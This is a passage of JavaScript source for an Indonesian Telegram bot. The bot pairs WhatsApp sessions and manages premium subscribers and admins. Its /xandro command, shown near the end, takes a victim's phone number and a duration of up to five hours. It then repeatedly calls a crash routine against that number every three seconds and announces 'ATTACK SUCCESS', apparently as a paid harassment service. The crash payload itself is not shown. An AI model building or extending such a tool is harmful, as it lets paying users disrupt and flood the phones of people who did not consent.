<b>CODE EXPIRED</b>

<pre>${pairingCodeHTML}</pre>

━━━━━━━━━━━━━━━━━━━━━━━━━━

┌─ ɪɴғᴏʀᴍᴀᴛɪᴏɴ
│ • User ID   : <tg-spoiler>${userIdHTML}</tg-spoiler>
│ • Number    : ${phoneHTML}
│ • Status    : EXPIRED ⌛
└─────────────────────

┌─ ɴᴏᴛᴇ
│ ⚠ Code has expired
│ ⚠ Please request new code with /addpairing
└─────────────────────

━━━━━━━━━━━━━━━━━━━━━━━━━━
» © 𐊖𐊒𐌵𐎘 | @zihardev`,
            {
              parse_mode: "HTML",
              reply_markup: {
                inline_keyboard: [[{ text: "❌ EXPIRED", callback_data: "expired" }]],
              },
            }
          );
        } catch (error) {
          console.error("Error updating expired message:", error);
        }
        return;
      }
      
      try {
        await ctx.telegram.editMessageText(
          ctx.chat.id,
          initialMsg.message_id,
          null,
          `━━━━━━━━━━━━━━━━━━━━━━━━━━
    ⸸ ᴘᴀɪʀɪɴɢ ᴄᴏᴅᴇ ⸸
━━━━━━━━━━━━━━━━━━━━━━━━━━

<b>YOUR PAIRING CODE:</b>

<pre>${pairingCodeHTML}</pre>

<i>👆 Tap code above to copy</i>

━━━━━━━━━━━━━━━━━━━━━━━━━━

┌─ ɪɴғᴏʀᴍᴀᴛɪᴏɴ
│ • User ID   : <tg-spoiler>${userIdHTML}</tg-spoiler>
│ • Number    : ${phoneHTML}
│ • Status    : Active ✅
│ • Expires   : ${escapeHTML(timeLeft)} seconds
└─────────────────────

┌─ ɪɴsᴛʀᴜᴄᴛɪᴏɴs
│ 1. Tap code or button to copy
│ 2. Open WhatsApp
│ 3. Settings → Linked Devices
│ 4. Link a Device
│ 5. Paste the code
└─────────────────────

┌─ ɴᴏᴛᴇ
│ ⚠ Keep code private
│ ⚠ Use official WhatsApp only
│ ⚠ This is YOUR personal session
└─────────────────────

━━━━━━━━━━━━━━━━━━━━━━━━━━
» © 𐊖𐊒𐌵𐎘 | @zihardev`,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [[{ text: "📋 COPY CODE", callback_data: `copy_${pairingCode}` }]],
            },
          }
        );
      } catch (error) {
        console.error("Error updating countdown:", error);
      }
    }, 1000);
    
  } catch (error) {
    console.error("Pairing Error:", error);
    const userIdHTML = escapeHTML(userId);
    const phoneHTML = escapeHTML(phoneNumber);
    
    const errorMessage = `━━━━━━━━━━━━━━━━━━━━━━━━━━
    ⸸ ᴘᴀɪʀɪɴɢ ᴇʀʀᴏʀ ⸸
━━━━━━━━━━━━━━━━━━━━━━━━━━

┌─ ᴅᴇᴛᴀɪʟs
│ • Error     : Failed to generate code
│ • User ID   : <tg-spoiler>${userIdHTML}</tg-spoiler>
│ • Number    : ${phoneHTML}
└─────────────────────

┌─ sᴏʟᴜᴛɪᴏɴs
│ ✓ Check if number is registered
│ ✓ Check internet connection
│ ✓ Try again later
└─────────────────────

━━━━━━━━━━━━━━━━━━━━━━━━━━
» © 𐊖𐊒𐌵𐎘 | @zihardev`;
    
    await ctx.reply(errorMessage, { parse_mode: "HTML" });
    
    userSessions.delete(userId);
    const userSessionPath = getUserSessionPath(userId);
    if (fs.existsSync(userSessionPath)) {
      fs.rmSync(userSessionPath, { recursive: true, force: true });
    }
  }
});


// ============================================
// COMMAND: /mysession
// ============================================
bot.command("mysession", async (ctx) => {
  const userId = ctx.from.id;
  const userSession = userSessions.get(userId);
  if (!userSession) {
    return await ctx.reply(`
    <blockquote>
━━━━━━━━━━━━━━━━━━━━━━━━━━
    ⸸ ɴᴏ sᴇssɪᴏɴ ⸸
━━━━━━━━━━━━━━━━━━━━━━━━━━

┌─ sᴛᴀᴛᴜs
│ ✗ No active session found
└─────────────────────

┌─ ᴀᴄᴛɪᴏɴ
│ • Use /addpairing to create session
└─────────────────────

━━━━━━━━━━━━━━━━━━━━━━━━━━
</blockquote>
» © 𐊖𐊒𐌵𐎘 | @zihardev`, { parse_mode: "HTML" });
  }
  const statusText = userSession.isConnected ? "Connected ✅" : "Disconnected ❌";
  const phoneText = userSession.phoneNumber || "Unknown";
  await ctx.reply(`
  <blockquote>
━━━━━━━━━━━━━━━━━━━━━━━━━━
    ⸸ ᴍʏ sᴇssɪᴏɴ ⸸
━━━━━━━━━━━━━━━━━━━━━━━━━━

┌─ sᴇssɪᴏɴ ɪɴғᴏ
│ • User ID   : ${userId}
│ • Status    : ${statusText}
│ • Number    : ${phoneText}
└─────────────────────

┌─ ᴀᴄᴛɪᴏɴs
│ • /deletesession - Remove session
│ • /reconnect - Reconnect WhatsApp
└─────────────────────

━━━━━━━━━━━━━━━━━━━━━━━━━━
</blockquote>
» © 𐊖𐊒𐌵𐎘 | @zihardev`, { parse_mode: "HTML" });
});

// ============================================
// COMMAND: /deletesession
// ============================================
bot.command("deletesession", async (ctx) => {
  const userId = ctx.from.id;
  const userSession = userSessions.get(userId);
  if (!userSession) {
    return await ctx.reply(`
    <blockquote>
━━━━━━━━━━━━━━━━━━━━━━━━━━
    ⸸ ɴᴏ sᴇssɪᴏɴ ⸸
━━━━━━━━━━━━━━━━━━━━━━━━━━

┌─ sᴛᴀᴛᴜs
│ ✗ No session to delete
└─────────────────────

━━━━━━━━━━━━━━━━━━━━━━━━━━
</blockquote>
» © 𐊖𐊒𐌵𐎘 | @zihardev`, { parse_mode: "HTML" });
  }
  try {
    if (userSession.sock) {
      await userSession.sock.logout();
    }
    userSessions.delete(userId);
    const userSessionPath = getUserSessionPath(userId);
    if (fs.existsSync(userSessionPath)) {
      fs.rmSync(userSessionPath, { recursive: true, force: true });
    }    
    await ctx.reply(`
    <blockquote>
━━━━━━━━━━━━━━━━━━━━━━━━━━
    ⸸ sᴇssɪᴏɴ ᴅᴇʟᴇᴛᴇᴅ ⸸
━━━━━━━━━━━━━━━━━━━━━━━━━━

┌─ sᴛᴀᴛᴜs
│ ✓ Session deleted ✅
│ ✓ WhatsApp disconnected
└─────────────────────

┌─ ɴᴇxᴛ sᴛᴇᴘ
│ • Use /addpairing to create new session
└─────────────────────

━━━━━━━━━━━━━━━━━━━━━━━━━━
</blockquote>
» © 𐊖𐊒𐌵𐎘 | @zihardev`, { parse_mode: "HTML" });
    console.log(chalk.green.bold(`✅ User ${userId} session deleted`));
  } catch (error) {
    console.error('Delete session error:', error);
    await ctx.reply('❌ Failed to delete session. Please try again.');
  }
});

// ============================================
// COMMAND: /reconnect
// ============================================
bot.command("reconnect", async (ctx) => {
  const userId = ctx.from.id;
  const userSession = userSessions.get(userId);
  if (!userSession) {
    return await ctx.reply(`
    <blockquote>
━━━━━━━━━━━━━━━━━━━━━━━━━━
    ⸸ ɴᴏ sᴇssɪᴏɴ ⸸
━━━━━━━━━━━━━━━━━━━━━━━━━━

┌─ sᴛᴀᴛᴜs
│ ✗ No session to reconnect
└─────────────────────

┌─ ᴀᴄᴛɪᴏɴ
│ • Use /addpairing to create session
└─────────────────────

━━━━━━━━━━━━━━━━━━━━━━━━━━
</blockquote>
» © 𐊖𐊒𐌵𐎘 | @zihardev`, { parse_mode: "HTML" });
  }
  try {
    await ctx.reply("⏳ Reconnecting your session...");    
    userSession.retryCount = 0;    
    await startUserSession(userId, userSession.phoneNumber);    
    await ctx.reply(`
    <blockquote>
━━━━━━━━━━━━━━━━━━━━━━━━━━
    ⸸ ʀᴇᴄᴏɴɴᴇᴄᴛɪɴɢ ⸸
━━━━━━━━━━━━━━━━━━━━━━━━━━

┌─ sᴛᴀᴛᴜs
│ ✓ Reconnection initiated ✅
│ ✓ Please wait...
└─────────────────────

━━━━━━━━━━━━━━━━━━━━━━━━━━
</blockquote>
» © 𐊖𐊒𐌵𐎘 | @zihardev`, { parse_mode: "HTML" });
    console.log(chalk.yellow.bold(`🔄 User ${userId} reconnecting...`));
  } catch (error) {
    console.error('Reconnect error:', error);
    await ctx.reply('❌ Failed to reconnect. Try /deletesession and create new one.');
  }
});

// ============================================
// COMMAND: /listsessions (Owner/Admin Only)
// ============================================
bot.command("listsessions", async (ctx) => {
  if (!(await guardOwnerOrAdmin(ctx))) return;
  if (userSessions.size === 0) {
    return await ctx.reply(`
    <blockquote>
━━━━━━━━━━━━━━━━━━━━━━━━━━
    ⸸ ɴᴏ sᴇssɪᴏɴs ⸸
━━━━━━━━━━━━━━━━━━━━━━━━━━

┌─ sᴛᴀᴛᴜs
│ ✗ No active sessions
└─────────────────────

━━━━━━━━━━━━━━━━━━━━━━━━━━
</blockquote>
» © 𐊖𐊒𐌵𐎘 | @zihardev`, { parse_mode: "HTML" });
  }
  let sessionList = `
  <blockquote>
━━━━━━━━━━━━━━━━━━━━━━━━━━
    ⸸ ᴀʟʟ sᴇssɪᴏɴs ⸸
━━━━━━━━━━━━━━━━━━━━━━━━━━

┌─ ᴀᴄᴛɪᴠᴇ sᴇssɪᴏɴs (${userSessions.size})
│\n`;

  let index = 1;
  for (const [userId, session] of userSessions.entries()) {
    const status = session.isConnected ? "✅" : "❌";
    const phone = session.phoneNumber || "Unknown";
    sessionList += `│ ${index}. User: ${userId}\n`;
    sessionList += `│    Status: ${status} | Phone: ${phone}\n│\n`;
    index++;
  }

  sessionList += `└─────────────────────

━━━━━━━━━━━━━━━━━━━━━━━━━━
</blockquote>
» © 𐊖𐊒𐌵𐎘 | @zihardev`;
  await ctx.reply(sessionList, { parse_mode: "HTML" });
});

// ============================================
// COMMAND: /removeallbot (Owner Only)
// ============================================
bot.command("removeallbot", async (ctx) => {
  if (!(await guardOwnerOrAdmin(ctx))) return;
  const confirmMsg = await ctx.reply(
    `━━━━━━━━━━━━━━━━━━━━━━━━━━
      ⚠️ ᴡᴀʀɴɪɴɢ ⚠️
━━━━━━━━━━━━━━━━━━━━━━━━━━

ᴀᴄᴛɪᴏɴ
Remove All Bot Sessions

ɪᴍᴘᴀᴄᴛ
All WhatsApp connections will be lost

sᴛᴀᴛᴜs
Awaiting Confirmation

━━━━━━━━━━━━━━━━━━━━━━━━━━

⚠️ This action cannot be undone
⚠️ All users need to pair again

━━━━━━━━━━━━━━━━━━━━━━━━━━
» © 𐊖𐊒𐌵𐎘 | @zihardev`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "✅ CONFIRM DELETE", callback_data: "confirm_removeall" },
            { text: "❌ CANCEL", callback_data: "cancel_removeall" }
          ]
        ]
      }
    }
  );
});

// ============================================
// CALLBACK HANDLERS
// ============================================

bot.action(/^copy_(.+)$/, async (ctx) => {
  try {
    const code = ctx.match[1];
    await ctx.answerCbQuery("✅ Code copied! Paste in WhatsApp", { show_alert: false });
    
    await ctx.reply(
      `<b>📋 PAIRING CODE:</b>\n\n<pre>${code}</pre>\n\n<i>Tap code above to copy</i>`,
      { parse_mode: "HTML" }
    );
  } catch (err) {
    console.error(err);
  }
});
bot.action("expired", async (ctx) => {
  await ctx.answerCbQuery("❌ Code has expired. Please request a new one.", { show_alert: true });
});
bot.action("confirm_removeall", async (ctx) => {
  try {
    await ctx.answerCbQuery("🗑️ Removing all sessions...", { show_alert: false });    
    const totalSessions = userSessions.size;
    for (const [userId, session] of userSessions.entries()) {
      try {
        if (session.sock) {
          await session.sock.logout();
        }
        const userSessionPath = getUserSessionPath(userId);
        if (fs.existsSync(userSessionPath)) {
          fs.rmSync(userSessionPath, { recursive: true, force: true });
        }
        try {
          await bot.telegram.sendMessage(userId, `━━━━━━━━━━━━━━━━━━━━━━━━━━
    ⸸ sᴇssɪᴏɴ ʀᴇᴍᴏᴠᴇᴅ ⸸
━━━━━━━━━━━━━━━━━━━━━━━━━━

┌─ ɴᴏᴛɪғɪᴄᴀᴛɪᴏɴ
│ ⚠ Your session has been removed by admin
│ ⚠ All data cleared
└─────────────────────

┌─ ɴᴇxᴛ sᴛᴇᴘ
│ • Use /addpairing to reconnect
└─────────────────────

━━━━━━━━━━━━━━━━━━━━━━━━━━
» © 𐊖𐊒𐌵𐎘 | @zihardev`, { parse_mode: "HTML" });
        } catch (e) {
          console.error(`Cannot notify user ${userId}:`, e);
        }
      } catch (error) {
        console.error(`Error removing session for user ${userId}:`, error);
      }
    }
    userSessions.clear();
    
    await ctx.editMessageText(`━━━━━━━━━━━━━━━━━━━━━━━━━━
    ⸸ ᴀʟʟ sᴇssɪᴏɴs ʀᴇᴍᴏᴠᴇᴅ ⸸
━━━━━━━━━━━━━━━━━━━━━━━━━━

┌─ ʀᴇsᴜʟᴛ
│ ✓ Total removed : ${totalSessions}
│ ✓ Status        : Success ✅
│ ✓ All data      : Cleared
└─────────────────────

━━━━━━━━━━━━━━━━━━━━━━━━━━
» © 𐊖𐊒𐌵𐎘 | @zihardev`, { parse_mode: "HTML" });
    console.log(chalk.green.bold(`✅ All ${totalSessions} sessions removed`));   
  } catch (error) {
    console.error('Error removing all sessions:', error);
    await ctx.editMessageText('❌ Error removing sessions. Check logs.');
  }
});
bot.action("cancel_removeall", async (ctx) => {
  await ctx.answerCbQuery("❌ Action cancelled", { show_alert: false });
  await ctx.editMessageText(`━━━━━━━━━━━━━━━━━━━━━━━━━━
    ⸸ ᴀᴄᴛɪᴏɴ ᴄᴀɴᴄᴇʟʟᴇᴅ ⸸
━━━━━━━━━━━━━━━━━━━━━━━━━━

┌─ sᴛᴀᴛᴜs
│ ✓ No sessions were removed
│ ✓ All data remains intact
└─────────────────────

━━━━━━━━━━━━━━━━━━━━━━━━━━
» © 𐊖𐊒𐌵𐎘 | @zihardev`, { parse_mode: "HTML" });
});


bot.command("addprem", async (ctx) => {
  await ctx.telegram.sendChatAction(ctx.chat.id, 'typing');
  if (!(await guardOwnerOrAdmin(ctx))) return;
  let userId, days;
  const args = ctx.message.text.trim()
    .split(/\s+/);
  if (ctx.message.reply_to_message) {
    userId = ctx.message.reply_to_message.from.id.toString();
    const dur = args[1];
    const parsedDays = parseDays(dur);
    if (parsedDays === null) {
      return await ctx.reply(
        "❌ Format durasi salah.\n\nGunakan:\n- Reply: /addprem 3d\n- Manual: /addprem <id_user> 3d\n\nCatatan: durasi wajib pakai 'd' (hari).", {
          reply_to_message_id: ctx.message.message_id
        }
      );
    }
    days = parsedDays;
  } else {
    if (args.length < 3) {
      return await ctx.reply(
        "❌ Format perintah salah.\n\nGunakan:\n- Reply: /addprem 3d\n- Manual: /addprem <id_user> 3d\n\nContoh: /addprem 123456789 7d", {
          reply_to_message_id: ctx.message.message_id
        }
      );
    }

    userId = String(args[1])
      .trim();
    const dur = args[2];
    const parsedDays = parseDays(dur);
    if (parsedDays === null) {
      return await ctx.reply(
        "❌ Format durasi salah! Wajib format 'Xd' (hari).\nContoh: 1d, 7d, 30d", {
          reply_to_message_id: ctx.message.message_id
        }
      );
    }
    days = parsedDays;
  }
  if (days < 1) {
    return await ctx.reply("❌ Minimal durasi adalah 1d (1 hari).", {
      reply_to_message_id: ctx.message.message_id
    });
  }
  if (days > 400) {
    return await ctx.reply("❌ Maksimal durasi adalah 400d (400 hari).", {
      reply_to_message_id: ctx.message.message_id
    });
  }
  try {
    const info = addOrExtendPremiumUser(userId, days, ctx.from.id);
    const expiresAt = info.expiresAt;
    const formattedExpiration = formatWIB(expiresAt);
    let userInfo = "";
    if (ctx.message.reply_to_message) {
      const u = ctx.message.reply_to_message.from;
      userInfo =
        `│ - *Username:* ${u.username ? "@" + u.username : "Tidak ada"}\n` +
        `│ - *Nama:* ${u.first_name || "Tidak diketahui"}\n`;
    }

    const successMessage = `
╭═══════『 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐀𝐜𝐭𝐢𝐯𝐚𝐭𝐞𝐝 』═══════⊱
│
├─────『 𝐔𝐬𝐞𝐫 𝐃𝐞𝐭𝐚𝐢𝐥𝐬 』
│ - *ID User:* ${userId}
${userInfo}│ - *Status:* Premium Active ✅
│ - *Durasi:* ${days} hari
│ - *Expired:* ${formattedExpiration}
│
├─────『 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐬𝐢 』
│ • Akses ke semua fitur premium
│ • Priority support
│ • Unlimited penggunaan
│
╰═════════════════════⊱`.trim();

    await ctx.replyWithMarkdown(successMessage, {
      reply_markup: {
        inline_keyboard: [
          [{
            text: "📊 Cek Status Premium",
            callback_data: `cekprem_${userId}`
          }],
          [{
            text: "📚 Panduan Premium",
            callback_data: "premium_guide"
          }]
        ]
      },
      reply_to_message_id: ctx.message.message_id
    });
  } catch (error) {
    console.error("Error in addprem:", error);
    await ctx.reply("❌ Terjadi kesalahan saat menambahkan user premium. Silakan coba lagi.", {
      reply_to_message_id: ctx.message.message_id
    });
  }
});
bot.action(/cekprem_(\d+)/, async (ctx) => {
  try {
    await ctx.answerCbQuery("📊 Mengecek premium...", {
      show_alert: false
    });
    const targetId = ctx.match[1];
    const info = getPremiumInfo(targetId);
    if (!info) {
      return await ctx.reply(
        `
╭═══════『 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐒𝐭𝐚𝐭𝐮𝐬 』═══════⊱
│
│ - ID: ${targetId}
│ - Status: ❌ NON-PREMIUM / EXPIRED
│
╰═════════════════════⊱`.trim(), {
          reply_to_message_id: ctx.update.callback_query.message.message_id
        }
      );
    }
    const now = Date.now();
    const remaining = info.expiresAt - now;
    return await ctx.reply(
      `
╭═══════『 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐒𝐭𝐚𝐭𝐮𝐬 』═══════⊱
│
│ - ID: ${targetId}
│ - Status: ✅ PREMIUM ACTIVE
│ - Expired: ${formatWIB(info.expiresAt)}
│ - Sisa: ${msToHuman(remaining)}
│
╰═════════════════════⊱`.trim(), {
        reply_to_message_id: ctx.update.callback_query.message.message_id
      }
    );
  } catch (error) {
    console.error("Error cekprem callback:", error);
  }
});

bot.command("delprem", async (ctx) => {
  await ctx.telegram.sendChatAction(ctx.chat.id, "typing");
  if (!(await guardOwnerOrAdmin(ctx))) return;
  const args = ctx.message.text.trim()
    .split(/\s+/);
  let userId = null;
  if (ctx.message.reply_to_message) {
    userId = String(ctx.message.reply_to_message.from.id);
  } else {
    if (args.length < 2) {
      return await ctx.reply(
        "❌ Format salah.\n\nGunakan:\n- Reply: (reply user) /delprem\n- Manual: /delprem <id_user>", {
          reply_to_message_id: ctx.message.message_id
        }
      );
    }
    userId = String(args[1])
      .trim();
  }
  try {
    const existed = deletePremiumUser(userId);
    if (!existed) {
      return await ctx.reply(
        `
╭═══════『 𝐃𝐞𝐥 𝐏𝐫𝐞𝐦 』═══════⊱
│
│ - ID User: ${userId}
│ - Status: Tidak terdaftar / sudah expired
│
╰═════════════════════⊱`.trim(), {
          reply_to_message_id: ctx.message.message_id
        }
      );
    }
    return await ctx.reply(
      `
╭═══════『 𝐃𝐞𝐥 𝐏𝐫𝐞𝐦 』═══════⊱
│
│ - ID User: ${userId}
│ - Status: Premium dihapus ✅
│
╰═════════════════════⊱`.trim(), {
        reply_to_message_id: ctx.message.message_id
      }
    );
  } catch (error) {
    console.error("Error in delprem:", error);
    return await ctx.reply("❌ Gagal menghapus premium. Coba lagi.", {
      reply_to_message_id: ctx.message.message_id
    });
  }
});
bot.command("cekprem", async (ctx) => {
  await ctx.telegram.sendChatAction(ctx.chat.id, "typing");
  if (!(await guardOwnerOrAdmin(ctx))) return;
  const args = ctx.message.text.trim()
    .split(/\s+/);
  let targetId;
  if (ctx.message.reply_to_message) {
    targetId = String(ctx.message.reply_to_message.from.id);
  } else if (args.length >= 2) {
    targetId = String(args[1])
      .trim();
  } else {
    targetId = String(ctx.from.id);
  }
  try {
    const info = getPremiumInfo(targetId);
    if (!info) {
      return await ctx.reply(
        `
╭═══════『 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐒𝐭𝐚𝐭𝐮𝐬 』═══════⊱
│
│ - ID: ${targetId}
│ - Status: ❌ NON-PREMIUM / EXPIRED
│
╰═════════════════════⊱`.trim(), {
          reply_to_message_id: ctx.message.message_id
        }
      );
    }
    const remaining = info.expiresAt - Date.now();
    return await ctx.reply(
      `
╭═══════『 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐒𝐭𝐚𝐭𝐮𝐬 』═══════⊱
│
│ - ID: ${targetId}
│ - Status: ✅ PREMIUM ACTIVE
│ - Expired: ${formatWIB(info.expiresAt)}
│ - Sisa: ${msToHuman(remaining)}
│
╰═════════════════════⊱`.trim(), {
        reply_to_message_id: ctx.message.message_id
      }
    );
  } catch (error) {
    console.error("Error in cekprem:", error);
    return await ctx.reply("❌ Terjadi kesalahan saat cek premium.", {
      reply_to_message_id: ctx.message.message_id
    });
  }
});

bot.command("addadmin", async (ctx) => {
  if (!(await guardOwnerOnly(ctx))) return;
  ensureAdminsFile();
  const args = ctx.message.text.trim().split(/\s+/);
  let userId = null;
  if (ctx.message.reply_to_message) {
    userId = String(ctx.message.reply_to_message.from.id);
  } else {
    if (args.length < 2) {
      return await ctx.reply(
        `
╭═══════『 𝐀𝐝𝐝 𝐀𝐝𝐦𝐢𝐧 』═══════⊱
│
├─────『 𝐂𝐚𝐫𝐚 𝐏𝐚𝐤𝐞 』
│ • Reply pesan user + ketik /addadmin
│ • /addadmin <id_user>
│
├─────『 𝐂𝐨𝐧𝐭𝐨𝐡 』
│ • Reply pesan + /addadmin
│ • /addadmin 123456789
│
╰═════════════════════⊱`.trim(),
        { reply_to_message_id: ctx.message.message_id }
      );
    }
    userId = String(args[1]).trim();
  }

  if (isAdmin(userId)) {
    return await ctx.reply(
      `
╭═══════『 𝐆𝐚𝐠𝐚𝐥 』═══════⊱
│
├─────『 𝐈𝐧𝐟𝐨 』
│ • User sudah menjadi admin
│ • ID: ${userId}
│
╰═════════════════════⊱`.trim(),
      { reply_to_message_id: ctx.message.message_id }
    );
  }

  try {
    addAdmin(userId);

    let userInfo = "";
    if (ctx.message.reply_to_message) {
      const u = ctx.message.reply_to_message.from;
      userInfo =
        `│ - *Username:* ${u.username ? "@" + u.username : "Tidak ada"}\n` +
        `│ - *Nama:* ${u.first_name || "Tidak diketahui"}\n`;
    }

    const successMessage = `
╭═══════『 𝐀𝐝𝐦𝐢𝐧 𝐀𝐝𝐝𝐞𝐝 』═══════⊱
│
├─────『 𝐃𝐞𝐭𝐚𝐢𝐥𝐬 』
│ - *ID:* ${userId}
${userInfo}│ - *Status:* Admin Active ✅
│
├─────『 𝐀𝐜𝐜𝐞𝐬𝐬 』
│ • /addprem command
│ • /delprem command
│ • Premium management
│
╰═════════════════════⊱`.trim();

    await ctx.replyWithMarkdown(successMessage, {
      reply_markup: {
        inline_keyboard: [[{ text: "📋 ADMIN LIST", callback_data: "listadmin" }]]
      },
      reply_to_message_id: ctx.message.message_id
    });
  } catch (error) {
    console.error("Error in addadmin:", error);
    await ctx.reply("❌ Terjadi kesalahan saat menambahkan admin. Silakan coba lagi.", {
      reply_to_message_id: ctx.message.message_id
    });
  }
});

bot.command("deladmin", async (ctx) => {
  if (!(await guardOwnerOnly(ctx))) return;

  ensureAdminsFile();

  const args = ctx.message.text.trim().split(/\s+/);
  let userId = null;

  // Reply mode
  if (ctx.message.reply_to_message) {
    userId = String(ctx.message.reply_to_message.from.id);
  } else {
    // Manual mode
    if (args.length < 2) {
      return await ctx.reply(
        `
╭═══════『 𝐃𝐞𝐥 𝐀𝐝𝐦𝐢𝐧 』═══════⊱
│
├─────『 𝐂𝐚𝐫𝐚 𝐏𝐚𝐤𝐞 』
│ • Reply pesan user + ketik /deladmin
│ • /deladmin <id_user>
│
├─────『 𝐂𝐨𝐧𝐭𝐨𝐡 』
│ • Reply pesan + /deladmin
│ • /deladmin 123456789
│
╰═════════════════════⊱`.trim(),
        { reply_to_message_id: ctx.message.message_id }
      );
    }
    userId = String(args[1]).trim();
  }

  try {
    const removed = removeAdmin(userId);

    if (!removed) {
      return await ctx.reply(
        `
╭═══════『 𝐃𝐞𝐥 𝐀𝐝𝐦𝐢𝐧 』═══════⊱
│
│ • Status: ID tidak ditemukan ❌
│ • ID: ${userId}
│
╰═════════════════════⊱`.trim(),
        { reply_to_message_id: ctx.message.message_id }
      );
    }

    return await ctx.reply(
      `
╭═══════『 𝐃𝐞𝐥 𝐀𝐝𝐦𝐢𝐧 』═══════⊱
│
│ • Status: Admin dihapus ✅
│ • ID: ${userId}
│
╰═════════════════════⊱`.trim(),
      { reply_to_message_id: ctx.message.message_id }
    );
  } catch (error) {
    console.error("Error in deladmin:", error);
    return await ctx.reply("❌ Terjadi kesalahan saat menghapus admin.", {
      reply_to_message_id: ctx.message.message_id
    });
  }
});
bot.action("listadmin", async (ctx) => {
  if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
    await ctx.answerCbQuery();
    return await ctx.reply("LU SIAPA BANGSAT?????", {
      reply_to_message_id: ctx.update.callback_query.message.message_id,
      reply_markup: {
        inline_keyboard: [[{ text: "💬 t.me/zihardev", url: "https://t.me/zihardev" }]]
      }
    });
  }

  ensureAdminsFile();
  loadAdmins();

  const adminListString =
    adminList.length > 0
      ? adminList.map((id) => `- ${id}`).join("\n")
      : "Tidak ada admin yang terdaftar.";

  const message = `
ℹ️ Daftar Admin:
${adminListString}
Total: ${adminList.length} admin.
  `.trim();

  await ctx.answerCbQuery();
  await ctx.replyWithMarkdown(message, {
    reply_to_message_id: ctx.update.callback_query.message.message_id
  });
});

const prosesrespone = async (target, ctx) => {
  const processMessage = `
╔══════════════════
║ 🎯TARGET: +${target.split('@')[0]}
║ ⚔️ STATUS: proses...
╚══════════════════`;
  try {
    await ctx.reply(processMessage);
  } catch (error) {
    console.error('Process error:', error);
  }
};

const donerespone = async (target, ctx) => {
  const successMessage = `
╔══════════════════ 
║ 🎯 TARGET: +${target.split('@')[0]}
║ ✨ STATUS: ATTACK SUCCESS
╚══════════════════`;
  try {
    await ctx.reply(successMessage);
  } catch (error) {
    console.error('Response error:', error);
  }
};
const checkWhatsAppConnection = async (ctx, next) => {
  if (!isWhatsAppConnected) {
    await ctx.reply("❌ WhatsApp belum terhubung. Silakan gunakan command /addpairing");
    return;
  }
  await next();
};


function formatPhoneNumber(number) {
  let cleaned = number.replace(/[^0-9]/g, '');
  cleaned = cleaned.replace(/^\+/, '');
  if (cleaned.startsWith('0')) {
    cleaned = '62' + cleaned.slice(1);
  }
  if (!cleaned.startsWith('62')) {
    cleaned = '62' + cleaned;
  }
  return cleaned;
}
//s


bot.command("xandro", checkWhatsAppConnection, checkPremium, async (ctx) => {
  await ctx.telegram.sendChatAction(ctx.chat.id, "record_audio");
  const userId = ctx.from.id;
  const st = getUserState(userId);
  const now = Date.now();
  if (st?.state === "running") {
    const remaining = (st.endAt || now) - now;
    return await ctx.reply(
      `
╭═══════『 𝐏𝐫𝐨𝐬𝐞𝐬 』═══════⊱
│
│ • Status: Masih berjalan ⏳
│ • Sisa: ${msToHuman(remaining)}
│ • Target: ${st.lastTarget || "-"}
│
╰═════════════════════⊱`.trim(), {
        reply_to_message_id: ctx.message.message_id
      }
    );
  }

  if (st?.state === "cooldown") {
    const remaining = (st.until || now) - now;
    return await ctx.reply(
      `
╭═══════『 𝐂𝐨𝐨𝐥𝐝𝐨𝐰𝐧 』═══════⊱
│
│ • Status: Masih Cooldown ⏳
│ • Tunggu: ${msToHuman(remaining)}
│
╰═════════════════════⊱`.trim(), {
        reply_to_message_id: ctx.message.message_id
      }
    );
  }
  if (activeRunLocks.has(String(userId))) {
    return await ctx.reply(
      "⏳ Perintahmu lagi diproses. Tunggu sampai selesai ya.", {
        reply_to_message_id: ctx.message.message_id
      }
    );
  }
  const args = ctx.message.text.split(/\s+/);
  if (args.length < 3) {
    return await ctx.reply(
      `
╭═══════⟨ 𝐂𝐚𝐫𝐚 𝐏𝐚𝐤𝐞 ⟩━━━━━━━╮
│
│ • /xandro 628xxx 1m   (1 menit)
│ • /xandro 628xxx 1j   (1 jam)
│
├─────『 𝐈𝐧𝐟𝐨 』
│ • Support 0/62/+62
│ • Max durasi: 5 jam (5j)
│ • Jeda per pesan: 3 detik
│
╰═════════════════════⊱`.trim(), {
        reply_to_message_id: ctx.message.message_id
      }
    );
  }
  const nomorHP = args[1];
  const durationInput = String(args[2])
    .toLowerCase();
  let durationMs = 0;
  if (durationInput.endsWith("m")) {
    const minutes = parseInt(durationInput.replace("m", ""), 10);
    if (isNaN(minutes) || minutes < 1) return await ctx.reply("❌ Menit tidak valid!");
    durationMs = minutes * 60 * 1000;
  } else if (durationInput.endsWith("j")) {
    const hours = parseInt(durationInput.replace("j", ""), 10);
    if (isNaN(hours) || hours < 1) return await ctx.reply("❌ Jam tidak valid!");
    if (hours > 5) return await ctx.reply("❌ Maksimal durasi adalah 5 jam!");
    durationMs = hours * 60 * 60 * 1000;
  } else {
    return await ctx.reply(
      "❌ Format waktu salah! Gunakan 'm' untuk menit atau 'j' untuk jam (contoh: 1m atau 1j)");
  }
  const nomorFix = formatPhoneNumber(nomorHP);
  const target = nomorFix + "@s.whatsapp.net";
  const startedAt = Date.now();
  const endAt = startedAt + durationMs;
  activeRunLocks.add(String(userId));
  setUserRunning(userId, {
    startedAt,
    endAt,
    durationMs,
    lastTarget: nomorFix
  });
  await prosesrespone(target, ctx);
  const runAttack = async () => {
    try {
      while (Date.now() < endAt) {
        if (!isWhatsAppConnected) break;
        await extendedCrash(target);
        await sleep(3000);
      }
    } catch (err) {
      console.error("runAttack error:", err);
    } finally {
      try {
        await donerespone(target, ctx);
      } catch (e) {
        console.error("donerespone error:", e);
      }
      const until = Date.now() + COOLDOWN_AFTER_DONE_MS;
      setUserCooldown(userId, {
        until,
        lastTarget: nomorFix,
        lastDoneAt: Date.now()
      });

      activeRunLocks.delete(String(userId));
    }
  };
  runAttack();
});



// ===== START MENU =====
bot.start(async (ctx) => {
  try {
    const chatId = ctx.chat?.id;
    if (!chatId) return;
    try {
      await ctx.telegram.sendChatAction(chatId, "typing");
    } catch {}
